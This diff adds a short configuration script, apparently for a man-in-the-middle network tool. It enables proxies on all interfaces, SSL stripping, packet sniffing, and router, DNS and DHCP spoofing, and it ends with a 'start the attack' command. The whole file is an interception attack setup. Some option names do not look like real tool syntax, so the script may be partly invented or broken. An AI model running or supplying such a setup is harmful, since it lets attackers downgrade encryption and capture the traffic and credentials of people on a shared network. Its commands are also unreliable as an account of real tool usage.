@@ -1,0 +1,29 @@
+# Enable the HTTP and HTTPS proxy
+set http.proxy.enabled true
+set https.proxy.enabled true
+
+# Set the proxy to listen on all interfaces
+set http.proxy.address 0.0.0.0
+set https.proxy.address 0.0.0.0
+
+# Set the proxy to listen on port 8080
+set http.proxy.port 8080
+set https.proxy.port 8080
+
+# Enable the SSL strip module
+set sslstrip.enabled true
+
+# Enable the sniffer module
+set sniffer.enabled true
+
+# Enable the router spoofing
+set net.spoof.enabled true
+
+# Enable the DNS spoofing
+set dns.spoof.enabled true
+
+# Enable the DHCP spoofing
+set dhcp.spoof.enabled true
+
+# Start the attack
+start
